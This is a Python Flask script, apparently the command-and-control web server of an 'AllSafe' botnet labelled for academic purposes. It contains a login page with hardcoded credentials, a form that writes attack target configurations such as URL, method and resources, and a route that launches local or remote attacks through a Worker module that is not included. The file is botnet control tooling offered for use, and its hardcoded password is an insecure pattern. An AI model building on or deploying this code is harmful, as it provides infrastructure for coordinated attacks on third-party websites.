#!/usr/bin/python3
"""
This is the startup script for the botnet. Please note that the software is developed under.
Python 3.4.x version of the interpreter.

Authors:    Alessio "Tyrell" Moretti & Federico "Elliot" Vagnoni
Version:    0.1.0
Created:    24 October 2016
Modified:   01 January 2017
"""

from flask import Flask
from flask import render_template
from flask import request
from flask import abort
from time import time
import json
import Worker

app = Flask(__name__)

"""
The Botnet will use a simple implementation of a micro WebServer using Flask

It will receive HTTP request in both GET and POST method on the root page.

If the method is POST, a login request is assumed and the login process will be performed;
if the process fails an error message will be returned; if it will succed the amdin page will be returned.

If the method is GET, the login form will be shown.
"""
@app.route("/", methods=['GET', 'POST'])
def loginPage():
    if request.method == 'POST':
        return login(request.form['u'], request.form['p'])
    else:
        return show_login_form()

"""
In the controlpage you can submit a new request of two different type: upload or attack.

Upload has not subtypes. It only allows to prepare the configuration file that will be used
to performa local or a remote attack using the json file given as example.

Attack has two subtypes: local or remote. The former will use the AllSafeBotnet class (defined in Worker.py) to carry
the attack using the override parameter set to True, while the latter will use the same method with the override param
set to False.
"""
@app.route("/submit", methods=['POST'])
def performAction():

    if "upload" in request.form:
        prepareConfigFile(request.form["upload"], request.form)
        return "ok"

    if "attack" in request.form:
        performAttack(request.form["attack"])
        return "ok"

    return abort(401) #TODO use a correct error response

def show_login_form():
    # The render template method will render an HTML page using Jinja2 template if any.
    return render_template("loginpage.html")


def login(username, password):
    #It will just valide the username and password and it will return the correct page
    if (validate(username, password)):
        return render_template("controlpage.html")
    else:
        return abort(401)


def validate(username, password):
    if (username == "fsociety" and password == "steelmountain"):
        # TODO Can we do it in a more effective way?
        return True


def prepareConfigFile(where, params):
    #The json file used as example will be used in order to not rwrite the already existing schema
    file = open("./utils/config_schema_example.json", "r")
    text = file.read()
    configfile = json.loads(text)
    file.close()

    #Only the useful key values will be changed accordingly #TODO more values to change
    configfile['last_modified'] = round(time())
    print(configfile['targets'])
    paramconfig = configfile['targets'][0]['request_params']
    paramconfig['method'] = params['method']
    paramconfig['url'] = params['url']
    new_res = []
    for res in params['resources'].split(";"):
        new_res.append(res)
    paramconfig['resources'] = new_res
    # TODO add prox
    paramconfig['encoding'] = params['encoding']
    configfile['targets'][0]['request_params'] = paramconfig

    #The json configuration will be written
    file = open("./utils/current_attack.txt", "w")
    file.write(json.dumps(configfile))
    file.close()
    return

def performAttack(who):
    #The method with the correct override value will be called accordingly
    if who == "local":
        allsafe = Worker.AllSafeBotnet()
        allsafe.attack('./utils/current_attack.txt', override=True)

    if who == "remote":
        allsafe = Worker.AllSafeBotnet()
        allsafe.attack('./utils/current_attack.txt', override=False)








if __name__ == "__main__":
    print("-------------------------------------------------------------")
    print("            ALLSAFE BOTNET - Academic purpose only           ")
    print("                          v. 0.1.0                           ")
    print("\nDeveloped with no harmful intentions and love by:          ")
    print("  - Alessio 'Tyrell' Moretti                                 ")
    print("  - Federico 'Elliot' Vagnoni                                ")
    print("-------------------------------------------------------------")
    app.run(host='0.0.0.0', port=5000)
